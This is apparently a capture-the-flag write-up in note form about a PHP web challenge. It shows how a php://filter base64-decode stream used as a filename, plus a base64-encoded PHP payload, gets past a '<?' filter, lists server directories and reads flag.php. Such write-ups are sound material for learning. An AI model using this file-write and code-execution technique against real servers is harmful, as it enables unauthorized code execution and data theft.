- ~~Session ID is controlled by a cookie~~ - I don't believe there is bypass to that


- Claimed to *"Sandbox"*: 
```PHP
ini_set('open_basedir', '.');
```
Maybe something like `./../../` will work
- Sources online claim its bypassable [#1](https://github.com/php/php-src/pull/7024)
	- Supposed injection (won't work because lookup for `<?` or `script`):
```PHP
<?php
`<?php echo var_dump(scandir('../../')); ?>`
?>
```
- ~~Bypass `strpos($data, '<?')  === false`~~ - Hint states looking elsewhere of code inclusion

- Got hint about creating a webshell with an LFI (local file inclusion) attack - meaning
	- It took a lot of time to find [this](https://readmedium.com/en/https:/medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb) - there's a direction to progress in with these special stream files:
```
php://filter/convert.base64-decode/resource=test.php
```
1. Create a file, then edit the the filename to be the stream file above, and enter a php code as base64:
```PHP
<?php var_dump(scandir("../../")) ?>
>>>PD9waHAgdmFyX2R1bXAoc2NhbmRpcigiLi4vLi4vIikpID8+Cg==
```
I was concerned about the `open_basedir` setting, but luckily it worked without its bypass, and there is a `flag.php`:
```
array(9) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(12) "clean_up.php" [3]=> string(8) "flag.php" [4]=> string(9) "index.php" [5]=> string(12) "php-fpm.sock" [6]=> string(10) "source.php" [7]=> string(7) "uploads" [8]=> string(3) "var" }
```
Now let's use the `file_get_contents("../../flag.php)` function:
# Solution
Found it hidden under html comment (`<!-- ... -->`)
```
